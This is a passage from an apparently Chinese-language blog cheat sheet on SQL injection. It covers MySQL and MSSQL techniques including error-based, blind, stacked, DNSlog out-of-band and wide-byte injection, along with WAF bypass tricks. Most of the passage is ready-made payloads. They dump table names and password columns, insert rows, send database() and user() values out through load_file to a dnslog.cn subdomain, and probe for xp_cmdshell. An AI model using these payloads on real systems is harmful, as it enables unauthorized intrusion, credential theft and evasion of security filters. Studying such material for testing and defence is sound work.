5,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a—+ (爆数据库，不断改变limit得到其他)</p><p>?id=1’ union select 1,count(),concat(0x7e,(select table_name from information_schema.tables where table_schema=’security’ limit 3,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a—+ （爆出users表）</p><p>?id=1’ union select 1,count(),concat(0x7e,(select column_name from information_schema.columns where table_name=’users’ limit 5,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a—+ （爆出password字段）</p><p>?id=1’ union select 1,count(),concat(0x7e,(select password from security.users limit 2,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a—+ （爆出数值）</p><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>判断注入点：</p><p>?id=1’ and sleep(5)—+ //正常休眠</p><p>?id=1” and sleep(5)—+ //无休眠</p><p>?id=1’) and sleep(5)—+//无休眠</p><p>?id=1”) and sleep(5)—+//无休眠</p><p>?id=1’ and if(length(database())=8,sleep(10),1)—+</p><p>爆出数据库：</p><p>?id=1’ and if(ascii(substr(database(),1,1))=115,1,sleep(10))—+</p><p>通过判断服务器没有睡眠，ascii码转换115为s ，那么就得出数据库第一个字符为s,下面就可以一次类推了,就不一</p><p>substr(database(),N,1)可以通过改变N的值来判断数据的地几个字符为什么</p><p>爆出数据表：</p><p>?id=1’ and if((select ascii(substr((select table_name from information_schema.tables where table_schema=”security”limit 0,1),1,1)))=101,sleep(5),1)— -</p><p>解释：security的第一张表的第一个字符ascii为101，为字符e</p><p> limit 0,1),N,1还是改变N的的得出第二个字符</p><p>再判断字符（ascii判断）</p><p>?id=1” and if(ascii(substr(database(),1,1))&gt;115,1,sleep(3))—+</p><p>（left语句判断）</p><p>?id=1’ and if(left(database(),1)=’s’,sleep(10),1) —+</p><p>?id=1’ and if(left(database(),2)=’sa’,sleep(10),1) —+</p><p>Substring函数判断</p><p>type=if(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1=’a’),11111,sleep(1))—+</p><p>附上一篇文档（盲注脚本）：<a href="https://blog.csdn.net/weixin_41598660/article/details/105162513">https://blog.csdn.net/weixin_41598660/article/details/105162513</a></p><h3 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h3><p>Left判断</p><p>?id=1’ and left(database(),1)=’s’ —+</p><p>?id=1’ and left(database(),2) &gt; ‘sa’ —+</p><p>Like语句判断</p><p>?id=1’ and (select table_name from information_schema.tables where table_schema=database() limit 0,1)like ‘e%’—+</p><p>Ascii语句判断</p><p>and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=115—+</p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>?id=1’ order by 3%23</p><p>?id=1’;show tables%23</p><p>?id=-1’;show columns from <code>1919810931114514</code>%23</p><p>?id=1’; insert into users(id,username,password) values(88,’aaa’,’bbb’)#<br><img src="https://image.3001.net/images/20220714/1657765459_62cf7e536914d9a20eebd.png!small" alt="image"></p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>二次注入一般是用于白盒测试、黑盒测试就算是找到注入也没办法攻击。<br><img src="https://image.3001.net/images/20220714/1657765520_62cf7e901e5532a44c092.png!small" alt="image"></p><p>博客链接：<a href="https://zhuanlan.zhihu.com/p/39917830">https://zhuanlan.zhihu.com/p/39917830</a></p><h3 id="加密解密注入"><a href="#加密解密注入" class="headerlink" title="加密解密注入"></a>加密解密注入</h3><p>Cookie: uname=YWRtaW4%3D</p><p>YWRtaW4%3D这是一个base64加密的字符串其中%3D是编码中的=符号，把他发送到编码模块当中解密,得到明文</p><p>发现这个是注入点需要将原来的注入方式重新加密发送给服务器，可以构造注入语句进行base64加密进行报错注入</p><p><img src="https://image.3001.net/images/20220714/1657765539_62cf7ea3330691d8a8415.png!small" alt="image"></p><h3 id="Dnslog对外注入"><a href="#Dnslog对外注入" class="headerlink" title="Dnslog对外注入"></a>Dnslog对外注入</h3><p>通常我们面对SQL注入过程中没有回显的情况下，只能通过盲注的方式来判断是否存在SQL注入，但是，使用盲注，手工测试是需要花费大量的时间的，可能会想到使用sqlmap直接去跑出数据，但在实际测试中，使用sqlmap跑盲注，有很大的几率，网站把ip给封掉，这就影响了我们的测试进度，也许你也可以使用代理池</p><p>注入语句：</p><p>?id=1’ and (select load_file(concat(‘\\’,(select hex(user())),’.682y4b.dnslog.cn/abc’))) —+</p><p>?id=1’ and (select load_file(concat(‘\\’,(select database()),’.682y4b.dnslog.cn/abc’))) —+</p><h3 id="中转注入"><a href="#中转注入" class="headerlink" title="中转注入"></a>中转注入</h3><p>比如受害者网站URL注入点是经过编码的，不能直接结合sqlmap进行漏洞利用，所以本地搭建一个网站，写一个php脚本编码文件，就可以结合sqlmap工具进行测试。</p><p>因为，注入点经过复杂编码之后，就不能直接结合sqlmap进行漏洞攻击了。或者sqlmap自己编写tamper脚本进行攻击</p><p>可参考：<a href="https://blog.csdn.net/weixin_40412037/article/details/110088186">https://blog.csdn.net/weixin_40412037/article/details/110088186</a></p><h3 id="搜索框注入"><a href="#搜索框注入" class="headerlink" title="搜索框注入"></a>搜索框注入</h3><p>注入payload：</p><p>%’ and ‘%1%’=’%1</p><p>%’ and ‘%1%’=’%2</p><p>Sql数据库语句：select * from sqltest where names like ‘%要查询的关键字%’</p><p>a%’ and 1=1– 正常</p><p>a%’ and 1=2– 错误</p><p>有搜索数据的框可以试试加个%总能大力出奇迹</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>前提</p><p>1.使用了addslashes()函数</p><p>2.数据库设置了编码模式为GBK</p><p>原理：前端输入%df时，首先经过addslashes()转义变成%df%5c%27，之后，在数据库查询前，因为设置了GBK编码，GBK编码在汉字编码范围内的两个字节都会重新编码成一个汉字。然后mysql服务器会对查询的语句进行GBK编码，%df%5c编码成了“运”，而单引号逃逸了出来，形成了注入漏洞</p><p>?id=%df’ and 1=1 —+</p><p>?id=%df’ and 1=2 —+</p><p>?id=-1%df’ union select 1,2,3 %23</p><h3 id="Cookie注入和Xff注入"><a href="#Cookie注入和Xff注入" class="headerlink" title="Cookie注入和Xff注入"></a>Cookie注入和Xff注入</h3><p>主要是看看程序员有没有在cookie中做了一些过滤，我们有没有可趁之机。</p><p>Cookie: ‘ order by 4—+</p><p>X-Forwarded-For注入</p><p>代表客户端真实的IP，通过修改X-Forwarded-for的值可以伪造客户端IP</p><p>尝试抓包添加插入X-Forwarded-For:127.0.0.1头进行sql注入</p><h3 id="Between注入"><a href="#Between注入" class="headerlink" title="Between注入"></a>Between注入</h3><p>主要用于盲注看页面是否有变化，原理如下，例如username的字符内容是test1，第一个字符是t，a到b搜索不了，页面不正常。 a到t就有了，页面正常</p><p>mysql语句： select * from users where id =1 and substr(username,1,1) between ‘a’ and ‘b’;</p><p>select * from users where id =1 and substr(username,1,1) between ‘a’ and ‘t’;</p><p>借鉴大佬图片：</p><p><img src="https://image.3001.net/images/20220714/1657765568_62cf7ec07edc75bbb2cd0.png!small" alt="image"></p><h3 id="limit注入"><a href="#limit注入" class="headerlink" title="limit注入"></a>limit注入</h3><p>mysql语句： select * from limit test limit 1,[可控点] or select … limit [可控点]</p><p>limit后面能够拼接的函数只有into和procedure，into可以用来写文件，本文我们不考虑。在Limit后面 可以用 procedure analyse()这个子查询，而且只能用extractvalue 和 benchmark 函数进行延时</p><p><strong><em>procedure analyse(updatexml(rand(),concat(0x3a,benchmark(10000000,sha1(1)))),1)</em></strong></p><p>select id from users;</p><p>select id from users limit 0,1 union select username from users;</p><p><img src="https://image.3001.net/images/20220714/1657765587_62cf7ed363bca35f96495.png!small" alt="image"></p><p>select field from user where id &gt;0 order by id limit 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</p><p>基于时间盲注：</p><p>SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</p><h3 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h3><p>select * from 表名 order by 列名(或者数字) asc；升序(默认升序)</p><p>select * from 表名 order by 列名(或者数字) desc；降序</p><p>当页面出现mysql报错信息时，注入点在 order by后面，此时可以利用报错信息进行注入，尝试报错注入</p><p><img src="https://image.3001.net/images/20220714/1657765602_62cf7ee2335a18b91bc38.png!small" alt="image"></p><p>?sort=1 and(select extractvalue(0x7e,concat(0x7e,database(),0x7e)))</p><p>?sort=(select 1 from(select 1 and if(ascii(substr((user()),1,1))=114,sleep(5),1))x)</p><h1 id="Sql注入绕过姿势"><a href="#Sql注入绕过姿势" class="headerlink" title="Sql注入绕过姿势"></a>Sql注入绕过姿势</h1><h3 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h3><p>两个空格代替一个空格，用Tab代替空格，%a0=空格：</p><p>payload:</p><p>%20 %09 %0a %0b %0c %0d %a0 %00 /<em>*/ /</em>!*/</p><p>最基本的绕过方法，用注释替换空格： /<em> 注释 </em>/</p><p><img src="https://image.3001.net/images/20220714/1657765618_62cf7ef2f3244c1249103.png!small" alt="image"></p><p>括号绕过空格</p><p>mysql语句：select(user())from dual where(1=1)and(2=2)</p><p>这种过滤方法常常用于time based盲注,例如：</p><p>?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23</p><h3 id="绕过引号"><a href="#绕过引号" class="headerlink" title="绕过引号"></a>绕过引号</h3><p>这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用<strong>十六进制</strong>来处理这个问题了。users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：</p><p>select column_name from information_schema.tables where table_name=0x7573657273</p><h3 id="绕过逗号"><a href="#绕过逗号" class="headerlink" title="绕过逗号"></a>绕过逗号</h3><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：</p><p>select substr(database() from 1 for 1);</p><p>select mid(database() from 1 for 1);</p><p>使用join：</p><p>union select 1,2#</p><p>等价于 union select * from (select 1)a join (select 2)b</p><p>使用like:</p><p>select ascii(mid(user(),1,1))=80 #</p><p>等价于 select user() like ‘r%’</p><p>对于limit可以使用offset来绕过：</p><p>select * from news limit 0,1 #</p><p>等价于下面这条SQL语句 select * from news limit 1 offset 0</p><h3 id="绕过比较符号"><a href="#绕过比较符号" class="headerlink" title="绕过比较符号()"></a>绕过比较符号()</h3><p>（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）：</p><p>使用greatest()、least（）：（前者返回最大值，后者返回最小值）</p><p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。 最常见的一个盲注的sql语句：</p><p>select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</p><p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。 那么上面的这条sql语句可以使用greatest变为如下的子句:</p><p>select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</p><h3 id="Between注入-1"><a href="#Between注入-1" class="headerlink" title="Between注入"></a>Between注入</h3><p>主要用于盲注看页面是否有变化，原理如下，例如username的字符内容是test1，第一个字符是t，a到b搜索不了，页面不正常。 a到t就有了，页面正常</p><p><img src="https://image.3001.net/images/20220714/1657765644_62cf7f0c4a9bf9f4e426d.png!small" alt="image"><br>使用between and：</p><p>使用between and:</p><p>between a and b：</p><p>between 1 and 1; 等价于 =1</p><h3 id="or-and-xor-not绕过："><a href="#or-and-xor-not绕过：" class="headerlink" title="or and xor not绕过："></a>or and xor not绕过：</h3><p>and=&amp;&amp; or=|| xor=| not=!</p><h3 id="绕过注释符"><a href="#绕过注释符" class="headerlink" title="绕过注释符"></a>绕过注释符</h3><p>（#，–(后面跟一个空格））过滤：</p><p>id=1’ union select 1,2,3||’1</p><p>最后的or ‘1闭合查询语句的最后的单引号，或者：</p><p>id=1’ union select 1,2,’3</p><h3 id="绕过等于号"><a href="#绕过等于号" class="headerlink" title="绕过等于号"></a>绕过等于号</h3><p>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</p><h3 id="绕过union，select，where等："><a href="#绕过union，select，where等：" class="headerlink" title="绕过union，select，where等："></a>绕过union，select，where等：</h3><p>（1）使用注释符绕过：</p><p>常用注释符：//，— , /**/, #, —+, — -, ;,%00,—a</p><p>用法：U/<strong>/ NION /</strong>/ SE/<strong>/ LECT /</strong>/user，pwd from user</p><p>（2）使用大小写绕过：</p><p>id=-1’UnIoN/**/SeLeCT</p><p>（3）内联注释绕过：</p><p>id=-1’/<em>!UnIoN</em>/ SeLeCT 1,2,concat(/<em>!table_name</em>/) FrOM /<em>information_schema</em>/.tables /<em>!WHERE \</em>//*!TaBlE_ScHeMa*/ like database()#</p><p>（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）：</p><p>id=-1’UNIunionONSeLselectECT1,2,3–-</p><h1 id="Sql注入Bypass"><a href="#Sql注入Bypass" class="headerlink" title="Sql注入Bypass"></a>Sql注入Bypass</h1><h3 id="WAF绕过-应用层"><a href="#WAF绕过-应用层" class="headerlink" title="WAF绕过-应用层"></a>WAF绕过-应用层</h3><p>Sql绕过姿势：<a href="https://www.csdn.net/tags/MtTaEgwsMTU4NzM1LWJsb2cO0O0O.html">https://www.csdn.net/tags/MtTaEgwsMTU4NzM1LWJsb2cO0O0O.html</a></p><h4 id="大小写-关键字替换"><a href="#大小写-关键字替换" class="headerlink" title="大小写/关键字替换"></a>大小写/关键字替换</h4><ul><li>id=1UnIoN/**/SeLeCT1,user()</li><li>Hex() bin() 等价于 ascii()</li><li>Sleep() 等价于 benchmark()</li><li>Mid() substring() 等价于substr()</li><li>@@user 等价于 User()</li><li>@@Version 等价于 version()</li></ul><p>绕过：</p><p>AND -&gt; &amp;&amp;</p><p>OR -&gt; || / ^</p><p>= -&gt; LIKE,REGEXP, BETWEEN, not &lt; and not &gt;，!&lt;&gt;</p><p>> X -&gt; not between 0 and X</p><p>WHERE -&gt; HAVING</p><p>手工盲注 1’||ascii(substr(database(),2,1))&gt;=’120</p><h4 id="各种编码"><a href="#各种编码" class="headerlink" title="各种编码"></a>各种编码</h4><p>大小写，URL，hex，%0A等</p><h4 id="注释使用"><a href="#注释使用" class="headerlink" title="注释使用"></a>注释使用</h4><p>//——+#//+:%00/!/等</p><h4 id="再次循环"><a href="#再次循环" class="headerlink" title="再次循环"></a>再次循环</h4><p>union==uunionnion</p><h4 id="分块传输"><a href="#分块传输" class="headerlink" title="分块传输"></a>分块传输</h4><p>比如在burp抓包时，存在Post请求的注入，如id=1’ and 1=2#</p><p>尝试分块传输</p><p><img src="https://image.3001.net/images/20220714/1657765719_62cf7f578b907ecc13fdc.png!small" alt="image"><br>进行分块传输的时候，请求头要加上<strong>Transfer-Encoding: Chunked</strong>，然后POST的数据规则如下</p><p>2 #下面的数据的长度，可以在后面加个分号然后添加注释（2; hello world） id #请求的参数 2 #下面的数据的长度 =1 #请求的值，和前面的id连起来 0 #表明分块请求结束，一个0和两个换行</p><p>最后就是大佬写出的插件，安装了一键分块Orz<br><a href="https://github.com/c0ny1/chunked-coding-converter">https://github.com/c0ny1/chunked-coding-converter</a></p><h4 id="等价替换"><a href="#等价替换" class="headerlink" title="等价替换"></a>等价替换</h4><p>hex()、bin() ==&gt; ascii()<br>sleep() ==&gt;benchmark()<br>concat_ws()==&gt;group_concat()<br>mid()、substr() ==&gt; substring()<br>@@user ==&gt; user()<br>@@datadir ==&gt; datadir()<br>举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　<br>或者：<br>substr((select ‘password’),1,1) = 0x70<br>strcmp(left(‘password’,1), 0x69) = 1<br>strcmp(left(‘password’,1), 0x70) = 0<br>strcmp(left(‘password’,1), 0x71) = -1</p><h4 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h4><p>?id=1&amp;id=2&amp;id=3</p><h4 id="编码解码及加密解密"><a href="#编码解码及加密解密" class="headerlink" title="编码解码及加密解密"></a>编码解码及加密解密</h4><ul><li>s-&gt;%73-&gt;%25%37%33</li><li>hex,unlcode,base64等</li></ul><h4 id="更改请求提交方式"><a href="#更改请求提交方式" class="headerlink" title="更改请求提交方式"></a>更改请求提交方式</h4><p>尝试更改Get请求为Post请求</p><ul><li>GET POST COOKIE等</li><li>POST-&gt;multipart/form-data</li></ul><h4 id="中间件HPP-HTTP参数污染"><a href="#中间件HPP-HTTP参数污染" class="headerlink" title="中间件HPP(HTTP参数污染)"></a>中间件HPP(HTTP参数污染)</h4><p><img src="https://image.3001.net/images/20220714/1657765734_62cf7f6657d4c137788e0.png!small" alt="image"></p><p><strong>HPP</strong>是HTTP Parameter Pollution的缩写，意为HTTP参数污染。</p><ul><li>原理：浏览器在跟服务器进行交互的过程中，浏览器往往会在GET/POST请求里面带上参数，这些参数会以 名称-值 对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。但是在HTTP协议中是允许同样名称的参数出现多次的。比如下面这个链接：<a href="http://www.baidu.com?name=aa&amp;name=bb，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。有的服务器是取第一个参数，也就是name=aa。有的服务器是取第二个参数，也就是name=bb。有的服务器两个参数都取，也就是name=aa,bb">http://www.baidu.com?name=aa&amp;name=bb，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。有的服务器是取第一个参数，也就是name=aa。有的服务器是取第二个参数，也就是name=bb。有的服务器两个参数都取，也就是name=aa,bb</a> 。这种特性在绕过一些服务器端的逻辑判断时，非常有用。</li><li>HPP漏洞，与Web服务器环境、服务端使用的脚本有关。如下是不同Web服务器对于出现多个参数时的选择</li><li>通过HPP接管账户,当网站开发者不熟悉Web服务器对于多参数时如何选择，将给攻击者可乘之机。HPP能针对客户端和服务端进行攻击。</li><li>HPP参数污染还可以用于绕过某些防火墙对于 SQL注入的检测，例如当Web服务器对多参数都同时选择时，我们可以用以下这种方式绕过某些防火墙：</li></ul><p><a href="http://www.test.com/index.asp?page=select">http://www.test.com/index.asp?page=select</a> 1,2,3 from table where id=1<br><a href="http://www.test.com/index.asp?page=select">http://www.test.com/index.asp?page=select</a> 1&amp;page=2,3 from table where id=1</p><p>HTTP参数污染是指当同一参数出现多次，不同的中间件会解析为不同的结果,以参数color=red&amp;color=blue为例</p><h3 id="WAF绕过-数据库特性"><a href="#WAF绕过-数据库特性" class="headerlink" title="WAF绕过-数据库特性"></a>WAF绕过-数据库特性</h3><p>mysql注释符有三种</p><ul><li>#,/…/,—…(注意—后面有一个空格，或者为—+)</li></ul><p>空格符</p><ul><li>0x09,0x0a-0x0d,0x20,0xa0</li></ul><p>特殊符号：%a换行符</p><ul><li>可结合注释符使用%23%0a,%2d%2d%0a</li></ul><p>内联注释</p><ul><li>/!UnIon12345SelEcT/1,user(),数字范围1000-50540</li></ul><p>mysql黑魔法</p><ul><li>select{xusername}from{x11test.admin};</li></ul><h3 id="WAF绕过-逻辑层"><a href="#WAF绕过-逻辑层" class="headerlink" title="WAF绕过-逻辑层"></a>WAF绕过-逻辑层</h3><p>逻辑问题</p><ol><li>云waf防护，一般我们会尝试通过查找站点的真实IP，从而绕过CDN防护。</li><li>当提交GET、POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输入,可尝试Bypass。</li><li>HTTP和HTTPS同时开放服务，没有做HTTP到HTTPS的强制跳转，导致HTTPS有WAF防护，HTTP没有防护，直接访问HTTP站点绕过防护。</li><li>特殊符号%00，部分waf遇到%00截断，只能获取到前面的参数，无法获取到后面的有害参数输入，从而导致Bypass。比如：id=1 %00 and 1=2 union select 1,2,column_name from information_schema.columns</li></ol><p>性能问题</p><ul><li>猜想1：在设计WAF系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。只要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。</li><li>猜想2：不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度就会引发bug，从而实现绕过。</li></ul><p>例子1：</p><p>?id=1and(select1)=(Select0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9</p><ul><li>0xA*1000指0xA后面A重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考也许在有些情况下可能不需要这么长也能溢出。</li></ul><p>例子2：</p><p>?a0=0&amp;a1=1&amp;…..&amp;a100=100&amp;id=1<br>union<br>select<br>1,schema_name,3<br>from<br>INFORMATION_SCHEMA.schemata</p><ul><li>获取请求参数，只获取前100个参数，第101个参数并没有获取到，导致SQL注入绕过。</li></ul><p>白名单</p><ul><li>方式一：IP白名单</li><li>从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造IP绕过的情况。测试方法：修改http的header来bypasswaf</li></ul><p>X-forwarded-for<br>X-remote-IP<br>X-originating-IP<br>x-remote-addr<br>X-Real-ip</p><p>方式二：静态资源</p><ul><li>特定的静态资源后缀请求，常见的静态文件(.js.jpg.swf.css等等)，类似白名单机制，waf为了检测效率，不去检测这样一些静态文件名后缀的请求。</li><li>Aspx/php只识别到前面的.aspx/.php后面基本不识别</li></ul><p><a href="http://10.9.9.201/sql.php?id=1">http://10.9.9.201/sql.php?id=1</a><br><a href="http://10.9.9.201/sql.php/1.js?id=1">http://10.9.9.201/sql.php/1.js?id=1</a></p><p>方式三：url白名单</p><ul><li>为了防止误拦，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势</li></ul><p>学习文章：<a href="https://mp.weixin.qq.com/s/gjEPi8DKVsfGyEv8fnzY3Q">https://mp.weixin.qq.com/s/gjEPi8DKVsfGyEv8fnzY3Q</a></p><h1 id="Sqlserver注入（mssql）"><a href="#Sqlserver注入（mssql）" class="headerlink" title="Sqlserver注入（mssql）"></a>Sqlserver注入（mssql）</h1><p><strong>SQL Server</strong>数据库是由Microsoft开发和推广的关系数据库管理系统(DBMS)，是一个比较大型的数据库。端口号为 <strong>1433</strong>。数据库后缀名 .mdf，注释符是 — 。延时命令：WAITFOR DELAY ‘0:0:2’</p><p><strong>SQLServer有三个权限级别：</strong></p><ul><li>sa权限：数据库操作，文件管理，命令执行，注册表读取等system。SQLServer数据库的最高权限</li><li>db权限：文件管理，数据库操作等权限 users-administrators</li><li>public权限：数据库操作 guest-users</li></ul><p><img src="https://image.3001.net/images/20220714/1657765752_62cf7f787d9033b77f774.png!small" alt="image"></p><p>判断是否是SA权限(数据库操作、文件管理、命令执行、注册表读取)</p><ol><li>select is_srvrolemember(‘sysadmin’)</li></ol><p>判断是否是db_owner权限 (数据库操作、文件管理)</p><ol><li>select is_member(‘db_owner’)</li></ol><p>判断是否是public权限 (数据库操作)</p><ol><li>select is_srvrolemember(‘public’)</li></ol><p>SQLServer数据库有6个默认的库，分别是4个系统数据库：master 、model 、msdb 、tempdb，和2个实例数据库：ReportServer、ReportServerTempDB。其中，系统数据库 model 和 tempdb 默认是没有数据表的。</p><p>附上payload：</p><p>select @@version; #查询数据库的版本</p><p>select @@servername; #查询服务名</p><p>select host_name(); #查询主机名，如果是用navicat远程连接的话，主机名是本地的名字</p><p>select db_name(); #查询当前数据库名</p><p>select db_name(1); #查询第一个数据库名</p><p>select db_name(2); #查询第二个数据库名</p><p>select user; #查询当前数据库的拥有者，结果为 dbo。dbo是每个数据库的默认用户，具有所有者权限，全称：datebaseOwner ，即DbOwner</p><p>use tempdb #切换到tempdb表</p><p>top n #查询前n条记录</p><p>limit 2,3 #查询第2条开始的3条数据，也就是2,3,4</p><p>select substring(‘string’,2,1) #截取给定字符串的索引为2的1个字符</p><p>select ascii(‘a’) #查询给定字符串的ascii值</p><p>select len(‘string’) #查询给定字符串的长度</p><p>EXEC sp_spaceused @updateusage = N’TRUE’; #查询当前数据库的大小</p><p>sp_spaceused ‘表名’ #查询指定表名的大小</p><p>EXEC master.sys.xp_dirtree ‘\192.168.106.5\xx.txt’,0,1;</p><p>判断是否是SA权限</p><p>select is_srvrolemember(‘sysadmin’)</p><p>判断是否是db_owner权限</p><p>select is_member(‘db_owner’)</p><p>判断是否是public权限</p><p>select is_srvrolemember(‘public’)</p><h3 id="普通注入-1"><a href="#普通注入-1" class="headerlink" title="普通注入"></a>普通注入</h3><p>order by 2 成功；order by 3 失败； order by 4 成功；order by 5 失败 说明列数位于 3-4之间。查找回显点</p><p>id=2 and 1=2 union all select null,null,null,null；挨个替换null 发现 select null,2,null,null 页面出现回显。</p><p>查找所在库名称添加： ?id=2 and 1=2 union all select 1,(select db_name()), ‘3’, 4</p><p>找到数据库名称。 提示：这里也可以使用db_name(1)、db_name(2)等查询其他数据</p><p>查找数据库表名称：?id=2 and 1=2 union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype = ‘U’),’3’,4提示: xtype=’U’ 为 用户表</p><p>?id=2 and 1=2 union all select 1,(select top 1 col_name(object_id(‘manage’),1) from sysobjects),’3’,4替换 col_name(object_id(‘manage’),1) 中的1 依次为 2，3，4查出所有列名。</p><p>查取数据: ?id=2 and 1=2 union all select 1,(select top 1 username from manage),’3’,4 获取用户名；</p><p>?id=2 and 1=2 union all select 1,(select top 1 password from manage),’3’,4 获取密码</p><h2 id="全回显操作"><a href="#全回显操作" class="headerlink" title="全回显操作"></a>全回显操作</h2><p>获取当前数据库中的表（有2个语句可供选择使用）【下列语句可一次爆数据库所有表（只限于mssql2005及以上版本）】</p><p>(select quotename(name) from 数据库名..sysobjects where xtype=’U’ FOR XML PATH(‘’))—</p><p>(select ‘|’%2bname%2b’|’ from 数据库名..sysobjects where xtype=’U’ FOR XML PATH(‘’))—</p><p>案例： mozhe_dbv2是数据库名字</p><p><img src="https://image.3001.net/images/20220714/1657765776_62cf7f9087fb6626ca007.png!small" alt="image"></p><p>一次爆指定表的所有列（只限于mssql2005及以上版本）：</p><p>(select quotename(name) from 数据库名..syscolumns where id =(select id from 数据库名..sysobjects where name=’指定表名’) FOR XML PATH(‘’))—</p><p>(select ‘|’%2bname%2b’|’ from 数据库名..syscolumns where id =(select id from 数据库名..sysobjects where name=’指定表名’) FOR XML PATH(‘’))—</p><p>案例： mange是表名<br><img src="https://image.3001.net/images/20220714/1657765789_62cf7f9d50b3e1805fb70.png!small" alt="image"></p><h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h3><p>and 1=(select @@VERSION) //<strong>MSSQL</strong>版本</p><p>And 1=(select db_name()) //当前数据库名</p><p>and 1=(select @@servername) //本地服务名</p><p>and 1=(select IS_SRVROLEMEMBER(‘sysadmin’)) //判断是否是系统管理员sa</p><p>常用权限：sysadmin、serveradmin、setupadmin、securityadmin、diskadmin、bulkadmin</p><p>and 1=(Select IS_MEMBER(‘db_owner’)) //判断是否是库权限dbo</p><p>and 1= (Select HAS_DBACCESS(‘master’)) //判断是否有库读取权限</p><h3 id="2-单个爆破："><a href="#2-单个爆破：" class="headerlink" title="(2)单个爆破："></a>(2)单个爆破：</h3><p>and 1=convert(int,(select top 1 table_name from information_schema.tables ))—获取第一个表名</p><p>and 1=convert(int,(select top 1 table_name from information_schema.tables where table_name not in(‘photoGalary’) )) 获取第二个表名</p><p>and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name=’login’ ))— 获取第一个列名</p><p>and 1=convert(int,(select top 1 username from login ))</p><p>and 1=convert(int,(select top 1 password from login ))</p><h3 id="2-全爆语句"><a href="#2-全爆语句" class="headerlink" title="(2)全爆语句"></a>(2)全爆语句</h3><p> 爆表，要求sqlserver版本2005以上</p><p>and 1=(select quotename(name) from 数据库名..sysobjects where xtype=’U’ FOR XML PATH(‘’))—<br>and 1=(select ‘|’%2bname%2b’|’ from 数据库名..sysobjects where xtype=’U’ FOR XML PATH(‘’))—</p><p>爆列</p><p>and 1=(select quotename(name) from 数据库名..syscolumns where id =(select id from 数据库名..sysobjects where name=’指定表名’) FOR XML PATH(‘’))—<br>and 1=(select ‘|’%2bname%2b’|’ from 数据库名..syscolumns where id =(select id from 数据库名..sysobjects where name=’指定表名’) FOR XML PATH(‘’))—</p><h3 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h3><p>aspx?id=1;if (select IS_SRVROLEMEMBER(‘sysadmin’))=1 WAITFOR DELAY ‘0:0:5’ –</p><p>如果是sa权限，就延时。</p><p>案例：</p><p><img src="https://image.3001.net/images/20220714/1657766248_62cf8168dbaad26776ceb.png!small" alt="img"></p><p>判断内容</p><p>aspx?id=1;if (ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)))&gt;1 WAITFOR DELAY ‘0:0:5’—</p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>1.aspx?id=1 and ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)) &gt;= 109</p><h3 id="XP-CMDSHELL检测"><a href="#XP-CMDSHELL检测" class="headerlink" title="XP_CMDSHELL检测"></a>XP_CMDSHELL检测</h3><p>看下目标的xp_cmdshell存储过程是否还在,主要是想看它有没有被删掉,你也可以用这种方式来查询其它你想知道的任何存储过程，如果判断还在，页面显示正常，不在的话页面报错。</p><p>and 1=(select count(*) from master..sysobjects where xtype = ‘x’ and name = ‘xp_cmdshell’) 